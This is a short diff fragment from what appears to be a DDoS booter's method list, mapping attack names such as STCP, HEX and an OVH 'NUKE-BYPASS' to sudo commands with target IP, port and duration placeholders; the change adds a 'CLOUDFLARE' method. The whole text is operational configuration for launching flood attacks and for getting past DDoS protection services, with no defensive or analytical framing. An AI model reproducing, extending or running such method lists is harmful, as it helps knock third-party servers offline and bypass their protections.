@@ -15,3 +15,5 @@ STCP : sudo ./STCP %ip %port 10 -1 %time ack
 HEX : sudo ./HEX OVH %ip %port 300
 
 NUKE-BYPASS : sudo ./HiperOVH %ip %port
+
+CLOUDFLARE : sudo ./cloudflare %ip 10 -1 300
